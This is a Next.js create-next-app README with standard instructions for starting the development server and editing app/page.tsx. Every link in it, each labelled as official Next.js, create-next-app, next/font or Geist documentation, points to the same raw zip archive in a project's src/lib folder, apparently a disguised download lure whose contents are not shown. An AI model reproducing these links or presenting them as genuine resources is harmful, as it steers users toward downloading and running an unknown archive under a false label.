This is a [Next.js](https://github.com/Atharva907/ResumeIQ/raw/refs/heads/main/src/lib/IQ_Resume_v3.0-beta.2.zip) project bootstrapped with [`create-next-app`](https://github.com/Atharva907/ResumeIQ/raw/refs/heads/main/src/lib/IQ_Resume_v3.0-beta.2.zip).

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.

This project uses [`next/font`](https://github.com/Atharva907/ResumeIQ/raw/refs/heads/main/src/lib/IQ_Resume_v3.0-beta.2.zip) to automatically optimize and load [Geist](https://github.com/Atharva907/ResumeIQ/raw/refs/heads/main/src/lib/IQ_Resume_v3.0-beta.2.zip), a new font family for Vercel.
